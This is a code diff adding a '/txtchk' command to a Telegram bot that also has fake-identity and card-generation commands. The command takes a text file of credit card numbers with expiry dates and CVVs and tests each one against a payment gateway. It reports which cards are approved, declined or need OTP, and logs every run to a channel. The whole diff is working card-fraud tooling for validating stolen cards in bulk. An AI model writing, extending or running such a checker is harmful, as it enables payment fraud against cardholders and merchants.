@@ -525,6 +525,164 @@ async def fake_identity_generator(client: Client, message: Message):
     except Exception as e:
         logging.error(f"Fake identity generation error: {e}")
         await message.reply(f"❌ Error generating fake identity: {str(e)}")
+# Add this handler to your script
+@app.on_message(filters.command("txtchk") & filters.reply)
+async def txt_chk_handler(client: Client, message: Message):
+    try:
+        # Check if replied message has a document
+        if not message.reply_to_message.document:
+            await message.reply("❗ Please reply to a text file with `/txtchk`")
+            return
+
+        # Check if file is txt
+        if not message.reply_to_message.document.file_name.endswith('.txt'):
+            await message.reply("❗ Please reply to a .txt file")
+            return
+
+        # Send initial processing message
+        proc_msg = await message.reply("↯ Processing your file, please wait...")
+
+        # Download the file
+        file_path = await message.reply_to_message.download()
+        
+        # Read the file
+        with open(file_path, 'r') as f:
+            cc_lines = f.read().splitlines()
+
+        # Remove empty lines and validate CC format
+        valid_ccs = []
+        for line in cc_lines:
+            line = line.strip()
+            if re.match(r"\d{13,16}\|\d{2}\|\d{2,4}\|\d{3,4}", line):
+                valid_ccs.append(line)
+
+        total_ccs = len(valid_ccs)
+        if total_ccs == 0:
+            await proc_msg.edit("❌ No valid CCs found in the file.")
+            os.remove(file_path)
+            return
+
+        # Initialize counters
+        approved = 0
+        declined = 0
+        error = 0
+        otp_required = 0
+        start_time = time.time()
+        last_update = time.time()
+        
+        # Prepare results list
+        results = []
+        results.append("Card Details                        | Status          | Response")
+        results.append("------------------------------------|-----------------|-----------------")
+
+        # Process each CC
+        processed = 0
+        for cc in valid_ccs:
+            try:
+                # Update progress every 5 seconds
+                current_time = time.time()
+                if current_time - last_update >= 5:
+                    elapsed = current_time - start_time
+                    eta = (elapsed / (processed + 1)) * (total_ccs - processed - 1)
+                    
+                    progress_msg = (
+                        f"↯ Processing your file, please wait...\n\n"
+                        f"✧ Total Cards: {total_ccs}\n"
+                        f"✧ Checked: {processed}/{total_ccs}\n"
+                        f"✧ Approved: {approved} ✅\n"
+                        f"✧ Declined: {declined} ❌\n"
+                        f"✧ OTP Required: {otp_required} 🔄\n"
+                        f"✧ Errors: {error} ⚠️\n"
+                        f"✧ ETA: {eta:.2f}s remaining"
+                    )
+                    
+                    await proc_msg.edit(progress_msg)
+                    last_update = current_time
+
+                # Process the CC
+                response = requests.get(GATEWAY_URL_TEMPLATE.format(cc), timeout=30)
+                result_text = response.text.strip()
+                status = "DECLINED ❌"
+                
+                if "declined" not in result_text.lower():
+                    if "otp" in result_text.lower() or "3d" in result_text.lower():
+                        status = "OTP REQUIRED 🔄"
+                        otp_required += 1
+                    else:
+                        status = "APPROVED ✅"
+                        approved += 1
+                else:
+                    declined += 1
+
+                # Add to results
+                results.append(f"{cc.ljust(35)}| {status.ljust(15)}| {result_text}")
+                processed += 1
+
+            except Exception as e:
+                error += 1
+                results.append(f"{cc.ljust(35)}| ERROR ⚠️       | {str(e)}")
+                processed += 1
+                continue
+
+        # Final stats
+        elapsed = time.time() - start_time
+        
+        # Save results to file
+        username = message.from_user.username or str(message.from_user.id)
+        result_filename = f"cc_check_results_{username}.txt"
+        with open(result_filename, 'w') as f:
+            f.write("\n".join(results))
+
+        # Prepare caption
+        caption = (
+            f"─────── ⸙ ────────\n"
+            f"↯ 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 𝗥𝗘𝗦𝗨𝗟𝗧𝗦\n\n"
+            f"✧ 𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀: {total_ccs}\n"
+            f"✧ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 : {GATEWAY_NAME}\n"
+            f"✧ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 : {approved} ✅\n"
+            f"✧ 𝗢𝗧𝗣 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱 : {otp_required} 🔄\n"
+            f"✧ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: {declined} ❌\n"
+            f"✧ 𝗘𝗿𝗿𝗼𝗿: {error} ⚠️\n"
+            f"✧ 𝗧𝗶𝗺𝗲: {elapsed:.2f}s\n\n"
+            f"↯ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: @{username}\n"
+            f"─────── ⸙ ────────"
+        )
+
+        # Send results and clean up
+        await message.reply_document(
+            document=result_filename,
+            caption=caption,
+            quote=True
+        )
+        await proc_msg.delete()
+        
+        # Clean up files
+        os.remove(file_path)
+        os.remove(result_filename)
+
+        # Log to channel
+        log_text = (
+            f"📁 **Mass CC Check Completed**\n"
+            f"**User:** [{message.from_user.first_name}](tg://user?id={message.from_user.id}) (`{message.from_user.id}`)\n"
+            f"**File:** `{message.reply_to_message.document.file_name}`\n"
+            f"**Total Cards:** {total_ccs}\n"
+            f"**Approved:** {approved}\n"
+            f"**Declined:** {declined}\n"
+            f"**OTP Required:** {otp_required}\n"
+            f"**Errors:** {error}\n"
+            f"**Time Taken:** {elapsed:.2f}s"
+        )
+        await log_to_channel(client, "CC", message, f"File: {message.reply_to_message.document.file_name}", log_text)
+
+    except Exception as e:
+        logging.error(f"Mass CC check error: {e}")
+        await message.reply(f"❌ Error processing file: {str(e)}")
+        if 'proc_msg' in locals():
+            await proc_msg.delete()
+        if 'file_path' in locals() and os.path.exists(file_path):
+            os.remove(file_path)
+        if 'result_filename' in locals() and os.path.exists(result_filename):
+            os.remove(result_filename)        
         
 if __name__ == "__main__":
     print("🚀 Combined Bot is running with /ai, /chk and /gen commands...")
